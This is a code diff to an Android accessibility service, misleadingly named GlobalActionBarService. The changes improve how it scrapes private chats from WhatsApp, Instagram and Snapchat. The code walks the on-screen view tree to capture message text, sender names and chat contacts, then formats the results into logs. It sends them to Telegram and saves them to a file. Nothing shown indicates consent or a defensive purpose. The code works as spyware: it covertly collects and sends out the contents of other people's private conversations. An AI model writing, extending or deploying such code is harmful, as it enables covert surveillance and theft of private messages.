@@ -30,27 +30,39 @@ public class GlobalActionBarService extends AccessibilityService {
     private long lastSendTime = 0;
     private String lastSentHash = "";
 
-    // Known view IDs for messages (Instagram, WhatsApp, Snapchat)
-    private Set<String> messageViewIds = new HashSet<String>() {{
+    // Known view IDs for message bubbles (containers)
+    private Set<String> messageContainerIds = new HashSet<String>() {{
+        // WhatsApp
+        add("com.whatsapp:id/outgoing_message_container");
+        add("com.whatsapp:id/incoming_message_container");
+        add("com.whatsapp:id/message_row");
+        // Instagram
+        add("com.instagram.android:id/row_message_container");
+        add("com.instagram.android:id/comment_row");
+        // Snapchat
+        add("com.snapchat.android:id/chat_bubble");
+    }};
+
+    // View IDs that contain the actual text inside a message
+    private Set<String> messageTextIds = new HashSet<String>() {{
+        add("com.whatsapp:id/message_text");
         add("com.instagram.android:id/row_message_text");
         add("com.instagram.android:id/comment_text");
         add("com.instagram.android:id/direct_message_text");
-        add("com.instagram.android:id/message_text");
-        add("com.whatsapp:id/message_text");
         add("com.snapchat.android:id/chat_message_text");
     }};
 
-    // Known view IDs for sender names
-    private Set<String> senderViewIds = new HashSet<String>() {{
+    // View IDs for sender names (for incoming messages)
+    private Set<String> senderNameIds = new HashSet<String>() {{
+        add("com.whatsapp:id/contact_name");
+        add("com.whatsapp:id/sender_name");
         add("com.instagram.android:id/row_user_name");
         add("com.instagram.android:id/comment_user_name");
         add("com.instagram.android:id/username_text_view");
-        add("com.instagram.android:id/direct_message_recipient_name");
-        add("com.whatsapp:id/contact_name");
         add("com.snapchat.android:id/chat_name");
     }};
 
-    // Blacklist – add any junk you see to this set
+    // Blacklist – same as before
     private Set<String> uiJunk = new HashSet<String>() {{
         add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
         add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
@@ -96,7 +108,7 @@ public class GlobalActionBarService extends AccessibilityService {
             return;
         }
 
-        // Only on window or content change (new message or scroll)
+        // Only on window or content change
         if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
             event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             return;
@@ -105,44 +117,29 @@ public class GlobalActionBarService extends AccessibilityService {
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
 
-        // 1. Get contact name
-        String contactName = findContactName(root);
+        // 1. Get chat contact name (the person you're talking to)
+        String chatContact = findChatContact(root, pkg);
 
-        // 2. Extract message texts from known view IDs
-        List<String> rawMessages = extractMessageTexts(root);
+        // 2. Extract messages with sender info
+        List<MessageEntry> messages = extractMessagesWithSenders(root, pkg);
 
-        // 3. Clean and deduplicate
-        Set<String> uniqueMessages = new HashSet<>();
-        for (String msg : rawMessages) {
-            String cleaned = cleanMessage(msg);
-            if (!cleaned.isEmpty()) uniqueMessages.add(cleaned);
-        }
+        if (messages.isEmpty()) return;
 
-        if (uniqueMessages.isEmpty()) return;
-
-        // 4. Build structured output
+        // 3. Build structured output
         StringBuilder logBuilder = new StringBuilder();
         logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
-        if (contactName != null && !contactName.isEmpty()) {
-            logBuilder.append("👤 Chat with: ").append(contactName).append("\n");
+        if (chatContact != null && !chatContact.isEmpty()) {
+            logBuilder.append("👤 Chat with: ").append(chatContact).append("\n");
         }
         logBuilder.append("─────────────────────\n");
-        for (String msg : uniqueMessages) {
-            // If message contains ":", try to split sender:message
-            if (msg.contains(":")) {
-                String[] parts = msg.split(":", 2);
-                if (parts.length == 2 && parts[0].trim().length() < 30) {
-                    logBuilder.append("  ").append(parts[0].trim()).append(": ").append(parts[1].trim()).append("\n");
-                    continue;
-                }
-            }
-            logBuilder.append("  Message: ").append(msg).append("\n");
+        for (MessageEntry msg : messages) {
+            logBuilder.append("  ").append(msg.sender).append(": ").append(msg.text).append("\n");
         }
 
         String fullLog = logBuilder.toString().trim();
-        if (fullLog.length() < 30) return; // ignore if not enough content
+        if (fullLog.length() < 30) return;
 
-        // 5. Deduplication & cooldown
+        // 4. Deduplication & cooldown
         String hash = Integer.toHexString(fullLog.hashCode());
         long now = System.currentTimeMillis();
         if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
@@ -151,15 +148,33 @@ public class GlobalActionBarService extends AccessibilityService {
         lastSentHash = hash;
         lastSendTime = now;
 
-        // 6. Send to Telegram
+        // 5. Send
         sendToTelegram(fullLog);
         writeToFile(fullLog);
     }
 
-    // ---- Helper methods ----
+    // ---- Helper classes and methods ----
 
-    private String findContactName(AccessibilityNodeInfo root) {
-        for (String id : senderViewIds) {
+    private static class MessageEntry {
+        String sender;
+        String text;
+        MessageEntry(String sender, String text) {
+            this.sender = sender;
+            this.text = text;
+        }
+    }
+
+    private String findChatContact(AccessibilityNodeInfo root, String pkg) {
+        // Try to find the contact name from the chat header
+        String[] headerIds;
+        if (pkg.equals("com.whatsapp")) {
+            headerIds = new String[]{"com.whatsapp:id/contact_name", "com.whatsapp:id/conversation_contact_name"};
+        } else if (pkg.equals("com.instagram.android")) {
+            headerIds = new String[]{"com.instagram.android:id/direct_message_recipient_name", "com.instagram.android:id/row_user_name"};
+        } else {
+            headerIds = new String[]{"com.snapchat.android:id/chat_name"};
+        }
+        for (String id : headerIds) {
             String name = findTextByViewId(root, id);
             if (name != null && !name.isEmpty()) return name;
         }
@@ -184,36 +199,134 @@ public class GlobalActionBarService extends AccessibilityService {
         return null;
     }
 
-    private List<String> extractMessageTexts(AccessibilityNodeInfo root) {
-        List<String> messages = new ArrayList<>();
-        for (String id : messageViewIds) {
-            List<String> found = findAllTextByViewId(root, id);
-            messages.addAll(found);
+    private List<MessageEntry> extractMessagesWithSenders(AccessibilityNodeInfo root, String pkg) {
+        List<MessageEntry> entries = new ArrayList<>();
+
+        // Find all message containers (bubbles)
+        List<AccessibilityNodeInfo> containers = findMessageContainers(root, pkg);
+
+        for (AccessibilityNodeInfo container : containers) {
+            // Determine if it's outgoing or incoming by checking the view ID
+            String viewId = container.getViewIdResourceName();
+            boolean isOutgoing = false;
+            if (viewId != null) {
+                if (viewId.contains("outgoing") || viewId.contains("self")) {
+                    isOutgoing = true;
+                } else if (viewId.contains("incoming") || viewId.contains("received")) {
+                    isOutgoing = false;
+                } else {
+                    // Fallback: check if there is a sender name node inside
+                    boolean hasSender = false;
+                    for (String nameId : senderNameIds) {
+                        if (findTextByViewId(container, nameId) != null) {
+                            hasSender = true;
+                            break;
+                        }
+                    }
+                    isOutgoing = !hasSender; // if no sender name, it's likely outgoing
+                }
+            }
+
+            // Extract message text from the container
+            String msgText = extractMessageTextFromContainer(container);
+            if (msgText == null || msgText.isEmpty()) continue;
+
+            // Clean the message
+            msgText = cleanMessage(msgText);
+            if (msgText.isEmpty()) continue;
+
+            // Determine sender name
+            String sender;
+            if (isOutgoing) {
+                sender = "You";
+            } else {
+                // Try to get contact name from the container (incoming)
+                String senderName = null;
+                for (String nameId : senderNameIds) {
+                    String found = findTextByViewId(container, nameId);
+                    if (found != null && !found.isEmpty()) {
+                        senderName = found;
+                        break;
+                    }
+                }
+                // If still null, try to get the global chat contact
+                if (senderName == null || senderName.isEmpty()) {
+                    senderName = findChatContact(root, pkg);
+                }
+                sender = (senderName != null && !senderName.isEmpty()) ? senderName : "Unknown";
+            }
+
+            entries.add(new MessageEntry(sender, msgText));
         }
-        return messages;
+
+        return entries;
     }
 
-    private List<String> findAllTextByViewId(AccessibilityNodeInfo node, String targetId) {
-        List<String> results = new ArrayList<>();
-        if (node == null) return results;
-        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
-            if (node.getText() != null) {
-                String text = node.getText().toString().trim();
-                if (!text.isEmpty()) results.add(text);
+    private List<AccessibilityNodeInfo> findMessageContainers(AccessibilityNodeInfo root, String pkg) {
+        List<AccessibilityNodeInfo> containers = new ArrayList<>();
+        traverseContainers(root, containers, pkg);
+        return containers;
+    }
+
+    private void traverseContainers(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list, String pkg) {
+        if (node == null) return;
+        // Check if this node is a known message container
+        String viewId = node.getViewIdResourceName();
+        if (viewId != null) {
+            for (String id : messageContainerIds) {
+                if (viewId.equals(id) || viewId.contains("message_row") || viewId.contains("bubble")) {
+                    list.add(node);
+                    return; // don't go deeper into this container to avoid duplicates
+                }
+            }
+        }
+        // Also check if it's a direct message text node (if no container found)
+        if (viewId != null) {
+            for (String id : messageTextIds) {
+                if (viewId.equals(id)) {
+                    // This is a text node, wrap it as a container (we'll treat it as standalone)
+                    list.add(node);
+                    return;
+                }
+            }
+        }
+        // Recurse children
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) traverseContainers(child, list, pkg);
+        }
+    }
+
+    private String extractMessageTextFromContainer(AccessibilityNodeInfo container) {
+        // Try to find a child with a known message text ID
+        for (String textId : messageTextIds) {
+            String text = findTextByViewId(container, textId);
+            if (text != null && !text.isEmpty()) return text;
+        }
+        // Fallback: collect all text in the container
+        StringBuilder sb = new StringBuilder();
+        collectAllText(container, sb);
+        return sb.toString();
+    }
+
+    private void collectAllText(AccessibilityNodeInfo node, StringBuilder sb) {
+        if (node == null) return;
+        if (node.getText() != null) {
+            String text = node.getText().toString().trim();
+            if (!text.isEmpty()) {
+                if (sb.length() > 0) sb.append(" ");
+                sb.append(text);
             }
         }
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) {
-                results.addAll(findAllTextByViewId(child, targetId));
-            }
+            if (child != null) collectAllText(child, sb);
         }
-        return results;
     }
 
     private String cleanMessage(String msg) {
         msg = msg.trim();
-        // Remove if contains junk
+        // Remove junk
         for (String junk : uiJunk) {
             if (msg.toLowerCase().contains(junk.toLowerCase())) return "";
         }
@@ -223,9 +336,7 @@ public class GlobalActionBarService extends AccessibilityService {
         if (msg.matches(".*\\d+[mh] .*")) return "";
         // Must contain at least one alphabetic character
         if (!msg.matches(".*[a-zA-Z].*")) return "";
-        // Too short
         if (msg.length() < 3) return "";
-        // All caps and short
         if (msg.equals(msg.toUpperCase()) && msg.length() < 8) return "";
         return msg;
     }
